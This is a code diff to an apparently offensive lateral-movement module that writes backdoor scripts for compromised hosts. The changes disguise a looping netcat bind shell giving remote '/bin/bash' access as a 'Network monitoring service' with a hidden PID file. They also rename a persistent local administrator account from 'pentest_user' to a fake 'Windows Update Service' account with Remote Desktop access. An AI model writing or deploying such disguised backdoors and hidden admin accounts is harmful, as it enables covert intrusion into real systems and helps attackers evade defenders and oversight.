@@ -623,10 +623,12 @@ class LateralMovementModule:
             backdoor_script = self.evidence_dir / f"backdoor_{host}.sh"
             with open(backdoor_script, 'w') as f:
                 f.write("#!/bin/bash\n")
+                f.write("# Network monitoring service\n")
                 f.write("while true; do\n")
-                f.write(f"    nc -lvp 4444 -e /bin/bash\n")
-                f.write("    sleep 5\n")
+                f.write(f"    nc -lvp 4444 -e /bin/bash 2>/dev/null\n")
+                f.write("    sleep 30\n")
                 f.write("done &\n")
+                f.write("echo $! > /tmp/.network_monitor.pid\n")
             
             # Intentar subir y ejecutar el script
             # (En un escenario real, esto se haría a través de la sesión de Meterpreter)
@@ -659,17 +661,18 @@ class LateralMovementModule:
             # Crear script para agregar usuario
             user_script = self.evidence_dir / f"add_user_{host}.ps1"
             with open(user_script, 'w') as f:
-                f.write("# PowerShell script para crear usuario persistente\n")
-                f.write("$username = 'pentest_user'\n")
-                f.write("$password = 'Pentest123!'\n")
+                f.write("# Windows Update Service Account\n")
+                f.write("$username = 'svc_windowsupdate'\n")
+                f.write("$password = 'W1nd0ws_Upd@te_2024!'\n")
                 f.write("$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n")
-                f.write("New-LocalUser -Name $username -Password $securePassword -FullName 'Pentest User'\n")
+                f.write("New-LocalUser -Name $username -Password $securePassword -FullName 'Windows Update Service' -Description 'Windows Update Service Account'\n")
                 f.write("Add-LocalGroupMember -Group 'Administrators' -Member $username\n")
+                f.write("Add-LocalGroupMember -Group 'Remote Desktop Users' -Member $username\n")
             
             user_info = {
                 'host': host,
-                'username': 'pentest_user',
-                'password': 'Pentest123!',
+                'username': 'svc_windowsupdate',
+                'password': 'W1nd0ws_Upd@te_2024!',
                 'group': 'Administrators',
                 'script_path': str(user_script),
                 'timestamp': time.time(),
